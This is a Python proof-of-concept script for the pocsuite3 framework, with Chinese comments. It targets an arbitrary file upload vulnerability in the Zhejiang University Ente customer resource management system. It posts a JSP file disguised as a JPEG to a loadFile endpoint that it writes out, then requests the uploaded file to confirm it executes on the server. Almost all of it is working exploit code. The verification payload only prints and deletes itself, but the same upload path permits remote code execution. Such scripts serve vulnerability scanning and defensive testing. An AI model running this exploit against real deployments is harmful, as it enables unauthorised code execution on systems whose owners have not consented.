'''
Date: 2023-11-16 14:12:02
LastEditTime: 2023-11-16 14:45:23
FilePath: \浙大恩特客户资源管理系统\浙大恩特客户资源管理系统任意文件上传_entphone.py
Description: 

Copyright (c) 2023 by ${git_name_email}, All Rights Reserved. 
'''
from collections import OrderedDict
from urllib.parse import urljoin
import re,json,time
from pocsuite3.api import POCBase, Output, register_poc, logger, requests, OptDict, OptString, VUL_TYPE
from pocsuite3.api import REVERSE_PAYLOAD, POC_CATEGORY


class POC(POCBase):
    vulID = '0'  # ssvid ID 如果是提交漏洞的同时提交 PoC,则写成 0
    version = '1'  #默认为1
    author = ['']  #  PoC作者的大名
    vulDate = '2023-11-16'  #漏洞公开的时间,不知道就写今天
    createDate = '2023-11-16'  # 编写 PoC 的日期
    updateDate = '2023-11-16'  # PoC 更新的时间,默认和编写时间一样
    references = ['']  # 漏洞地址来源,0day不用写
    name = '浙大恩特客户资源管理系统任意文件上传'  # PoC 名称
    appPowerLink = ''  # 漏洞厂商主页地址
    appName = '浙大恩特客户资源管理系统'  # 漏洞应用名称
    appVersion = '''ALL'''  # 漏洞影响版本
    vulType = VUL_TYPE.UPLOAD_FILES  #漏洞类型,类型参考见 漏洞类型规范表
    desc = '''
        浙大恩特客户资源管理系统中存在安全漏洞，允许攻击者向系统上传任意恶意JSP文件，从而可能导致潜在的远程执行代码攻击。该漏洞可能会对系统的完整性和安全性产生严重影响。
    '''

  # 漏洞简要描述
    samples = ['']  # 测试样列,就是用 PoC 测试成功的网站
    install_requires = ['']  # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写
    pocDesc = '''
    检测:pocsuite -r .\poc++.py -u url(-f url.txt) --verify 
    '''
    category = POC_CATEGORY.EXPLOITS.REMOTE

    def _verify(self):
        result = {}
        path = "/entsoft/CustomerAction.entphone;.js?method=loadFile"
        url = self.url + path
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36',
            'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundarye8FPHsIAq9JN8j2A',
        }
        data ='''------WebKitFormBoundarye8FPHsIAq9JN8j2A\r
Content-Disposition: form-data; name="file";filename="test.jsp"\r
Content-Type: image/jpeg\r
\r
<% out.println(new java.io.File(application.getRealPath(request.getServletPath())));new java.io.File(application.getRealPath(request.getServletPath())).delete(); %>\r
------WebKitFormBoundarye8FPHsIAq9JN8j2A--'''
        try:
            resq = requests.post(url=url,data=data,headers=headers,timeout=5)
            if resq.status_code == 200 and'test.jsp' in resq.text:
                filepath = json.loads(resq.text)['filepath']
                resq_2 = requests.get(url=self.url+filepath)
                if '\\photo\\test.jsp' in resq_2.text:
                    #print(resq.text)
                    result['VerifyInfo'] = {}
                    result['VerifyInfo']['URL'] = url
                    result['VerifyInfo']['POC'] = path
                    
        except Exception as e:
            return
        # 本身访问一次一个自动删除，但是不知道为什么没自动删除，可能系统原因，需要延迟几秒访问才行
        time.sleep(5)
        requests.get(url=self.url+filepath)
        return self.parse_output(result)

    def _attack(self):
        return self._verify()
    def parse_attack(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output

    def _shell(self):
        return

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output
    
register_poc(POC)
